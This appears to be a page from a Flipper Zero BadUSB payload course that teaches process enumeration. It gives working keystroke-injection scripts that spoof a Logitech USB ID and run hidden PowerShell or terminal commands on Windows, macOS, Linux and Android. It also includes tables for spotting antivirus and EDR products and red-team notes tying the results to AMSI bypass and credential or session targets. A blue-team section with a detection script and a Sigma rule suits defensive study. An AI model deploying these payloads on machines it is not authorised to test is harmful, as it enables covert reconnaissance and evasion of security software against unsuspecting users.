# FZ-I14: Process Enumeration

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I14 |
| **Name** | Process Enumeration |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~6 seconds |
| **Output** | %TEMP%\processes.txt |
| **MITRE ATT&CK** | T1057 (Process Discovery) |

## What This Payload Does

Enumerates all running processes on the target system, including process names, IDs, paths, and parent relationships. This information reveals security software, running applications, and potential targets for injection or termination.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Process Enumeration
REM Target: Windows 10/11
REM Action: Lists all running processes
REM Output: %TEMP%\processes.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Enumerate processes
STRINGLN $p = @()
STRINGLN $p += "=== PROCESS ENUMERATION ==="
STRINGLN $p += "Generated: $(Get-Date)"
STRINGLN $p += "Total Processes: $((Get-Process).Count)"
STRINGLN $p += ""

REM All processes with details
STRINGLN $p += "=== ALL PROCESSES ==="
STRINGLN $p += (Get-Process | Select-Object Id, ProcessName, Path, StartTime | Sort-Object ProcessName | Format-Table -AutoSize | Out-String -Width 200)

REM High-privilege processes
STRINGLN $p += "=== SYSTEM PROCESSES ==="
STRINGLN $p += (Get-Process -IncludeUserName 2>$null | Where-Object {$_.UserName -match 'SYSTEM|NETWORK'} | Select ProcessName, UserName | Out-String)

STRINGLN $p | Out-File "$env:TEMP\processes.txt"
STRINGLN exit
```

---

## Process Information Value

### Security Software Identification

| Process Name | Product |
|-------------|---------|
| MsMpEng.exe | Windows Defender |
| ccSvcHst.exe | Symantec |
| avp.exe | Kaspersky |
| mbam.exe | Malwarebytes |
| SentinelAgent.exe | SentinelOne |
| CrowdStrike*.exe | CrowdStrike Falcon |
| cb.exe | Carbon Black |
| cylance*.exe | Cylance |
| coreServiceShell.exe | Trend Micro |

### EDR/Monitoring Software

| Process | Product |
|---------|---------|
| MsSense.exe | Microsoft Defender ATP |
| WinDefend | Windows Defender Service |
| Sysmon.exe | Sysmon (Microsoft) |
| osqueryd.exe | OSQuery |
| taniumclient.exe | Tanium |
| splunkd.exe | Splunk Forwarder |

### Remote Access Tools

| Process | Tool |
|---------|------|
| TeamViewer.exe | TeamViewer |
| AnyDesk.exe | AnyDesk |
| mstsc.exe | Remote Desktop |
| LogMeIn*.exe | LogMeIn |
| VNC*.exe | VNC variants |

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN echo "=== PROCESS LIST ===" > /tmp/processes.txt
STRINGLN echo "Generated: $(date)" >> /tmp/processes.txt
STRINGLN echo "" >> /tmp/processes.txt
STRINGLN ps aux >> /tmp/processes.txt
STRINGLN echo "" >> /tmp/processes.txt
STRINGLN echo "=== PROCESS TREE ===" >> /tmp/processes.txt
STRINGLN pstree 2>/dev/null >> /tmp/processes.txt || ps -axo ppid,pid,command >> /tmp/processes.txt
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN echo "=== PROCESS LIST ===" > /tmp/processes.txt
STRINGLN echo "Generated: $(date)" >> /tmp/processes.txt
STRINGLN ps auxf >> /tmp/processes.txt
STRINGLN echo "" >> /tmp/processes.txt
STRINGLN echo "=== LISTENING SERVICES ===" >> /tmp/processes.txt
STRINGLN ss -tlnp >> /tmp/processes.txt
STRINGLN echo "" >> /tmp/processes.txt
STRINGLN echo "=== SECURITY PROCESSES ===" >> /tmp/processes.txt
STRINGLN ps aux | grep -iE 'clamd|snort|ossec|wazuh|auditd|falcon' >> /tmp/processes.txt
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN echo "=== ANDROID PROCESSES ===" > /sdcard/processes.txt
STRINGLN ps -A >> /sdcard/processes.txt
STRINGLN echo "" >> /sdcard/processes.txt
STRINGLN echo "=== RUNNING APPS ===" >> /sdcard/processes.txt
STRINGLN pm list packages -3 >> /sdcard/processes.txt
REM Full process list requires root
STRINGLN su -c "ps -A -o pid,ppid,user,name" >> /sdcard/processes.txt 2>/dev/null
```

### iOS

iOS does not expose process information via keyboard-accessible methods. App sandbox isolation prevents cross-app process enumeration.

---

## Advanced Process Queries

### Find Processes by User

```powershell
Get-Process -IncludeUserName | Group-Object UserName |
    Select Name, Count | Sort-Object Count -Descending
```

### Find Processes with Network Connections

```powershell
Get-NetTCPConnection | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Process = $proc.ProcessName
        PID = $_.OwningProcess
        LocalPort = $_.LocalPort
        RemoteAddress = $_.RemoteAddress
        State = $_.State
    }
} | Where-Object { $_.RemoteAddress -ne "127.0.0.1" }
```

### Find Unsigned/Suspicious Processes

```powershell
Get-Process | ForEach-Object {
    $sig = Get-AuthenticodeSignature $_.Path -ErrorAction SilentlyContinue
    if ($sig.Status -ne 'Valid') {
        [PSCustomObject]@{
            Name = $_.ProcessName
            Path = $_.Path
            SignatureStatus = $sig.Status
        }
    }
}
```

### Process Command Lines

```powershell
Get-WmiObject Win32_Process | Select Name, ProcessId, CommandLine |
    Format-Table -AutoSize -Wrap
```

---

## Red Team Perspective

### Process Intelligence Uses

| Information | Use Case |
|-------------|----------|
| Security software | Evasion planning |
| Running apps | User activity understanding |
| Admin tools | Identify admin access |
| Browsers | Session hijacking targets |
| Email clients | Credential targets |
| VPN clients | Network configuration |

### Process-Based Decision Making

```
If Defender running → Use AMSI bypass
If EDR detected → Consider alternatives
If no AV → Proceed with caution (might be monitored)
If development tools → Developer machine, might have creds
```

### Attack Chain

```
Process Enum → Security Assessment → Evasion Planning → Payload Execution
      ↑
  You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Process Enumeration Commands**
   - Get-Process in PowerShell
   - tasklist from cmd
   - WMI queries for processes

2. **Behavioral Patterns**
   - Enumeration followed by specific process termination
   - Targeting security processes

3. **Suspicious Timing**
   - Immediate enumeration after new process start
   - Repeated enumeration

### Detection Script

```powershell
# Monitor for process enumeration
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 200 | Where-Object {
    $_.Message -match 'Get-Process|tasklist|Win32_Process'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,300)}}
```

### Sigma Rule

```yaml
title: Process Discovery Activity
status: experimental
description: Detects enumeration of running processes
logsource:
    product: windows
    category: ps_script
detection:
    selection_cmdlet:
        ScriptBlockText|contains:
            - 'Get-Process'
            - 'tasklist'
            - 'Win32_Process'
    selection_wmi:
        ScriptBlockText|contains|all:
            - 'Get-WmiObject'
            - 'Win32_Process'
    condition: selection_cmdlet or selection_wmi
level: low
tags:
    - attack.discovery
    - attack.t1057
```

### Prevention

1. **Process Hiding** (Limited)
   - Some EDR can hide their processes
   - Rootkit-level protection

2. **Monitoring**
   - Alert on mass process enumeration
   - Track enumeration patterns

3. **Honeypots**
   - Fake security process names
   - Decoy processes that alert on access

---

## Practice Exercises

### Exercise 1: Count Processes
Count total running processes:
```ducky
STRINGLN (Get-Process).Count
```

### Exercise 2: Find Browser Processes
List all browser-related processes:
```ducky
STRINGLN Get-Process | Where-Object { $_.ProcessName -match 'chrome|firefox|edge|brave|opera' }
```

### Exercise 3: Find High Memory Users
List top 10 memory-consuming processes:
```ducky
STRINGLN Get-Process | Sort-Object WorkingSet -Descending | Select -First 10 ProcessName, @{N='MB';E={[math]::Round($_.WorkingSet/1MB,2)}}
```

### Exercise 4: Check for Security Software
```ducky
STRINGLN $av = @('MsMpEng','avp','mbam','ccSvcHst','SentinelAgent','CrowdStrike'); Get-Process | Where-Object { $av -contains $_.ProcessName }
```

---

## Payload File

Save as `FZ-I14_Process_Enumeration.txt`:

```ducky
REM FZ-I14: Process Enumeration
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN "=== PROCESSES ===$(Get-Date)`nTotal: $((Get-Process).Count)`n$(Get-Process|Select Id,ProcessName,Path|Sort ProcessName|Out-String)"|Out-File "$env:TEMP\proc.txt";exit
```

---

[← FZ-I13 Linux Persistence](FZ-I13_Linux_Persistence.md) | [Back to Intermediate](README.md) | [Next: FZ-I15 Installed Software →](FZ-I15_Installed_Software.md)
